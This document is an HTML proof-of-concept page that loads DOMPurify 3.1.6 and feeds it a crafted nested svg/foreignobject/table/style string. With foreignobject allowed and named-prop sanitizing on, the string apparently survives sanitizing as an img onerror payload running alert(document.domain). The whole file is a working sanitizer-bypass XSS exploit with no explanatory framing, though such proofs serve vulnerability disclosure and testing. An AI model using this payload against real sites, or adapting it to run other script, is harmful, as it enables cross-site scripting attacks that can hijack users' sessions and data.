```html
<!DOCTYPE html>
<html>

<head>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.1.6/purify.js" integrity="sha512-yZ9pl6TapwP2odiDqqft8Nivoh02kwS0vA2qnvBfkavbHNCBXWbUL08D2SuJSjwuP6ERSfsC+a1TAvmTGTc3yA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>

<body>
  <script>
    document.body.innerHTML = DOMPurify.sanitize(`<svg><a><foreignobject><a><table><a></table><style><!--</style></svg><a id="-><img src onerror=alert(document.domain)>">`, {
      "ADD_TAGS": ["foreignobject"],
      "SANITIZE_NAMED_PROPS": true
    });
  </script>
</body>

</html>
```
